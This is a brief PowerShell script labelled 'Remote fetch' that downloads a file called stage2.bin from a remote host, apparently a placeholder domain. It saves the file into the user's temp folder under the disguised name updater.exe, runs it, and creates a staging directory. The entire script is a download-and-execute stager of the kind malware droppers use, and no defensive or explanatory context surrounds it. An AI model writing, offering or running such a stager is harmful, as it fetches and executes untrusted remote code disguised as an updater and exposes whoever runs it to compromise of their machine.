
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://adatum.com/stage2.bin",
    [string]$PayloadPath = "$env:TEMP\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $PayloadPath)
Start-Process -FilePath $PayloadPath
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
